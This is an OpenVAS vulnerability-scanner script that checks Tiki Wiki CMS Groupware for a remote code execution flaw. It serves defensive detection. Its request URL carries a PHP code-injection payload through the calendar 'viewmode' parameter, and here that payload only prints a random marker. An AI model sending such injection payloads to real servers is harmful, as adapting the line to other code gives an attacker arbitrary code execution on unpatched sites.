###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tikiwiki_calendar_rce_vuln.nasl 5836 2017-04-03 09:37:08Z teissa $
#
# Tiki Wiki CMS Groupware Calendar Remote Command Execution Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tiki:tikiwiki_cms/groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106105");
  script_version("$Revision: 5836 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-03 11:37:08 +0200 (Mon, 03 Apr 2017) $");
  script_tag(name:"creation_date", value:"2016-06-23 12:12:32 +0700 (Thu, 23 Jun 2016)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("TikiWiki Calendar Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TikiWiki/installed");

  script_xref(name:"URL", value:"https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39965/");

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to a remote code execution vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The calendar feature of Tiki Wiki CMS Groupware doesn't correctly check the input for
  the parameter viewmode which may lead to remote code execution.");

  script_tag(name:"impact", value:"A remote attacker may execute arbitrary code.");

  script_tag(name:"affected", value:"Versions 14.2, 12.5 LTS, 9.11 LTS and 6.15 and prior");

  script_tag(name:"solution", value:"Update to the latest supported version.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit( 0 );

ver = infos['version'];
dir = infos['location'];

if( version_is_greater( version:ver, test_version:"14.2" ) ||
    version_in_range( version:ver, test_version:"12.6", test_version2:"12.9" ) ) {
  exit( 99 );
}

vrfy = "OpenVAS-RCE-Test-" + rand();
if( dir == "/" ) dir = "";
url = dir + "/tiki-calendar.php?viewmode=';print(" + vrfy + ");$a='";

if( http_vuln_check( port:port, url:url, pattern:vrfy, check_header:TRUE ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
